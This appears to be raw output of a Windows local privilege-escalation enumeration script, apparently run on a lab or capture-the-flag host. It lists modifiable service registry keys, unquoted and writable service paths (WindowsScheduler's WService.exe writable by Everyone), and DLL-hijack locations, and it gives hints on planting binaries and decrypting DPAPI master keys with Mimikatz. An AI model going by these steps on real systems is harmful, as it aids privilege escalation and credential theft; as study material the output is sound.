You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\intelide                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\intelppm                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IpFilterDriver                                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iphlpsvc                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IPMIDRV                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IPNAT                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\isapnp                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iScsiPrt                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kbdclass                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kbdhid                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kdnic                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KeyIso                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KPSSVC                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KSecDD                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KSecPkg                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ksthunk                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KtmRm                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LanmanServer                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LanmanWorkstation                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ldap                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lltdio                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lltdsvc                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lmhosts                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Lsa                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS2                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS3                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SSS                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSM                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\luafv                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\megasas                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\megasr                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mlx4_bus                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MMCSS                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Modem                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\monitor                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mouclass                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mouhid                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mountmgr                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mpsdrv                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MpsSvc                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb10                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb20                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsBridge                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSDTC                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSDTC                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Msfs                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mshidkmdf                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mshidumdf                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\msisadrv                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSiSCSI                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\msiserver                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSKSSRV                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsLbfoProvider                                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSPCLOCK                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSPQM                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsRPC                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mssmbios                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSTEE                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MTConfig                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Mup                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mvumis                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\napagent                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NcaSvc                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ndfltr                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDIS                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisCap                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisImPlatform                                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisTapi                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ndisuio                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisVirtualBus                                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisWan                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDISWANLEGACY                                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDProxy                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetBIOS                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetBT                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Netlogon                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Netman                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\netprofm                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetTcpPortSharing                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\netvsc                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NlaSvc                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Npfs                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\npsvctrig                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nsi                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nsiproxy                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NTDS                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ntfs                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Null                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nvraid                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nvstor                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nv_agp                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Parport                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\partmgr                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pci                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pciide                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pcmcia                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pcw                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pdc                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PEAUTH                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfDisk                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfHost                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfNet                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfOS                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfProc                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pla                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PlugPlay                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PolicyAgent                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PortProxy                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Power                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PptpMiniport                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PrintNotify                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Processor                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ProfSvc                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Psched                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PsShutdownSvc                                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ql2300i                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ql40xx2i                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\qlfcoei                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAcd                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAgileVpn                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAuto                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Rasl2tp                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasMan                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasPppoe                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasSstp                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rdbss                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDMANDK                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rdpbus                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPDR                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPNP                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPUDD                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RdpVideoMiniport                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ReFS                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RemoteAccess                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RemoteRegistry                                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RpcEptMapper                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RpcLocator                                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RSoPProv                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rspndr                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\s3cap                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sacdrv                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sacsvr                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sbp2port                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SCardSvr                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ScDeviceEnum                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\scfilter                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Schedule                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SCPolicySvc                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sdbus                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sdstor                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\secdrv                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\seclogon                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SENS                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SerCx                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SerCx2                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Serenum                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Serial                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sermouse                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SessionEnv                                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sfloppy                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SharedAccess                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ShellHWDetection                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SiSRaid2                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SiSRaid4                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\smbdirect                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\smphost                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SNMP                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SNMPTRAP                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\spaceport                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SpbCx                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Spooler                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sppsvc                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srv                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srv2                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srvnet                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SSDPSRV                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SstpSvc                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\stexstor                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storahci                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storflt                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\stornvme                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storvsc                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storvsp                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\svsvc                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\swenum                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\swprv                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SysMain                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SystemEventsBroker                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TapiSrv                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Tcpip                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIP6                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIP6TUNNEL                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tcpipreg                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIPTUNNEL                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tdx                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\terminpt                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TermService                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Themes                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\THREADORDER                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TieringEngineService                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TPM                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TSDDD                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TsUsbFlt                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TsUsbGD                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tsusbhub                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tunnel                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\uagp35                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UALSVC                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UASPStor                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UCX01000                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\udfs                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UEFI                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UI0Detect                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\uliagpkx                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\umbus                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UmPass                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UmRdpService                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\upnphost                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbccgp                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbehci                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbhub                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBHUB3                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbohci                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbprint                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBSTOR                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbuhci                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBXHCI                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VaultSvc                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vdrvroot                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vds                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VerifierExt                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vhdmp                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\viaide                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Vid                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmbus                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VMBusHID                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmbusr                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicguestinterface                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicheartbeat                                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmickvpexchange                                           
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicrdv                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicshutdown                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmictimesync                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicvss                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volmgr                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volmgrx                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volsnap                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vpci                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vpcivsp                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vsmraid                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VSS                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VSTXRAID                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\W32Time                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\w3logsvc                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\W3SVC                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WacomPen                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wanarp                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wanarpv6                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WAS                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wcmsvc                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WcsPlugInService                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wdf01000                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wecsvc                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WEPHOSTSVC                                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wercplsupport                                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WerSvc                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WFPLWFS                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WIMMount                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WindowsScheduler                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinHttpAutoProxySvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinMad                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Winmgmt                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinNat                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinRM                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Winsock                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinSock2                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinVerbs                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WmiAcpi                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WmiApRpl                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wmiApSrv                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\workerdd                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WPDBusEnum                                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ws2ifsl                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WSService                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wtlmdrv                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wuauserv                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WudfPf                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wudfsvc                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\XEN                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenbus                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenbus_monitor                                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenfilt                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xeniface                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xennet                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenvbd                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenvif                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xmlprov                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{35E1B823-1443-4A40-875E-3A1C41494DB7}                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{51E2531C-2946-4F58-A4BB-072994EB3731}                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{C7568B63-C424-48B3-AB9B-6D1F004D5AFC}                    
                                                                                                                              
 [+] UNQUOTED SERVICE PATHS                                                                                                   
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'                                                                                                        
   [i] The permissions are also checked and filtered using icacls                                                             
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                              
aspnet_state                                                                                                                  
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe                                                             
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                              
                                                                                                                              
AWSLiteAgent                                                                                                                  
 C:\Program Files\Amazon\XenTools\LiteAgent.exe                                                                               
Invalid parameter "Files\Amazon\XenTools\LiteAgent.exe"                                                                       
NetTcpPortSharing                                                                                                             
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                                
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                                 
                                                                                                                              
PerfHost                                                                                                                      
 C:\Windows\SysWow64\perfhost.exe                                                                                             
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                              
                                                                                                                              
PsShutdownSvc                                                                                                                 
 C:\Windows\PSSDNSVC.EXE                                                                                                      
C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)                                                                            
                        BUILTIN\Administrators:(I)(F)                                                                         
                                                                                                                              
TrustedInstaller                                                                                                              
 C:\Windows\servicing\TrustedInstaller.exe                                                                                    
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                     
                                                                                                                              
WindowsScheduler                                                                                                              
 C:\PROGRA~2\SYSTEM~1\WService.exe                                                                                            
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)                                                                             
                                  BUILTIN\Administrators:(I)(F)                                                               
                                                                                                                              
                                                                                                                              
[*] DLL HIJACKING in PATHenv variable                                                                                         
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations                      
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate                               
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking                         
C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)                                                                           
                    BUILTIN\Administrators:(M)                                                                                
                    BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                    
                                                                                                                              
C:\Windows NT SERVICE\TrustedInstaller:(F)                                                                                    
           BUILTIN\Administrators:(M)                                                                                         
           BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                             
                                                                                                                              
C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)                                                                      
                         BUILTIN\Administrators:(M)                                                                           
                         BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                               
                                                                                                                              
                                                                                                                              
[*] CREDENTIALS                                                                                                               
                                                                                                                              
 [+] WINDOWS VAULT                                                                                                            
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault                         
                                                                                                                              
Currently stored credentials:                                                                                                 
                                                                                                                              
* NONE *                                                                                                                      
                                                                                                                              
 [+] DPAPI MASTER KEYS                                                                                                        
   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt                                
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi                                 
                                                                                                                              
                                                                                                                              
    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect                                                       
                                                                                                                              
                                                                                                                              
Mode                LastWriteTime     Length Name                                                                             
----                -------------     ------ ----                                                                             
